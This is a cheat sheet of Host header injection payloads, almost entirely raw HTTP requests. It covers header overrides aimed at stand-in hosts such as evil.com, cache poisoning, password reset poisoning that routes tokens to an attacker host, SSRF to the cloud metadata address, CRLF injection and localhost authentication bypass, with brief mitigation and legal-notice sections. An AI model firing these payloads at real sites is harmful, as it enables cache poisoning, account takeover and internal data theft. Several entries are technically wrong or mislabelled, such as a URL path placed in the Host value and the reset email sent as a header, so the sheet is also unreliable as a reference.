# **Host Header Injection Payload Cheat Sheet**

This document contains comprehensive techniques for testing and exploiting Host header vulnerabilities.

## **1. Basic Host Header Injection**

### **Simple Header Override**
```http
GET / HTTP/1.1
Host: evil.com
```

### **Port Manipulation**
```http
GET / HTTP/1.1
Host: victim.com:9999
```

## **2. Advanced Header Manipulation**

### **X-Forwarded-Host Bypass**
```http
GET / HTTP/1.1
Host: legit.com
X-Forwarded-Host: evil.com
```

### **Multiple Host Headers**
```http
GET / HTTP/1.1
Host: victim.com
Host: evil.com
```

## **3. Cache Poisoning via Host Header**

### **Cache Key Manipulation**
```http
GET / HTTP/1.1
Host: victim.com.evil.com
```

### **Protocol Switching**
```http
GET / HTTP/1.1
Host: victim.com:443
```

## **4. Password Reset Poisoning**

### **Reset Token Hijacking**
```http
POST /reset-password HTTP/1.1
Host: evil.com
Email: victim@company.com
```

## **5. SSRF via Host Header**

### **Internal Service Access**
```http
GET / HTTP/1.1
Host: 169.254.169.254
```

### **AWS Metadata Exploit**
```http
GET / HTTP/1.1
Host: 169.254.169.254/latest/meta-data/
```

## **6. Virtual Host Brute Forcing**

### **Subdomain Enumeration**
```http
GET / HTTP/1.1
Host: admin.victim.com
```

### **Common Subdomains**
```
Host: dev.victim.com
Host: test.victim.com
Host: staging.victim.com
Host: internal.victim.com
```

## **7. Web Cache Deception**

### **Cache Poisoning**
```http
GET / HTTP/1.1
Host: victim.com
X-Forwarded-Host: attacker.com
```

## **8. Bypass Techniques**

### **Line Wrapping**
```http
GET / HTTP/1.1
 Host: evil.com
```

### **Header Spoofing**
```http
GET / HTTP/1.1
X-Host: victim.com
Host: evil.com
```

## **9. Special Character Injection**

### **CRLF Injection**
```http
GET / HTTP/1.1
Host: victim.com%0d%0aX-Malicious: header
```

### **Null Byte Injection**
```http
GET / HTTP/1.1
Host: victim.com%00evil.com
```

## **10. Real-World Exploit Examples**

### **Admin Panel Access**
```http
GET /admin HTTP/1.1
Host: localhost
```

### **Bypassing Authentication**
```http
GET / HTTP/1.1
Host: 127.0.0.1
```

## **Testing Methodology**

1. **Identify Host header usage** in application flow
2. **Test header manipulation** with various techniques
3. **Verify impact** (cache poisoning, SSRF, etc.)
4. **Check for validation bypasses**
5. **Document all findings**

## **Mitigation Strategies**

- Validate Host headers against whitelist
- Disable unused headers (X-Forwarded-Host)
- Use relative URLs in applications
- Implement proper cache key configuration
- Monitor for suspicious Host header values

## **Legal Notice**

These techniques should only be used for authorized security testing. Unauthorized testing may violate laws and system policies. Always obtain proper permission before testing.